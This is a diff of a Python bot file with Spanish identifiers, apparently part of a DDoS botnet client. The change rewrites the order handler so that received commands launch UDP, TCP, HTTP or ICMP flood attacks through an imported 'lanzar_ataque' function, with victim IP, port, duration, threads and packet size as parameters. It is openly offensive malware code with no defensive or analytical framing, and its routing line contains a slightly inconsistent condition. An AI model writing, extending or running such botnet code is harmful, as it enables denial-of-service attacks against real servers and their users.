@@ -30,14 +30,20 @@ def atacar(ip_victima, puerto_victima, duracion):
     print(f"[BOT] Ataque terminado. Paquetes enviados: {enviados}")
 
 
+from ataques import lanzar_ataque
+
 def ejecutar(orden):
-    tipo = orden.get("tipo")
-    params = orden.get("parametros", {})
-    ip = params.get("ip")
-    puerto = params.get("puerto")
-    duracion = params.get("duracion")
-    if tipo == "ataque":
-        atacar(ip, int(puerto), int(duracion))
+    tipo = orden.get("tipo")        # "udp" / "tcp" / "http" / "icmp"
+    p = orden.get("parametros", {})
+    lanzar_ataque(
+        tipo,
+        p.get("ip"),
+        int(p.get("puerto", 0)),
+        int(p.get("duracion", 10)),
+        hilos=int(p.get("hilos", 4)),
+        tam=int(p.get("tam", 1024)),
+        ruta=p.get("parametros_http", {}).get("ruta", "/") if isinstance(p.get("ruta"), dict) else p.get("ruta", "/"),
+    )
 
 
 if __name__ == "__main__":
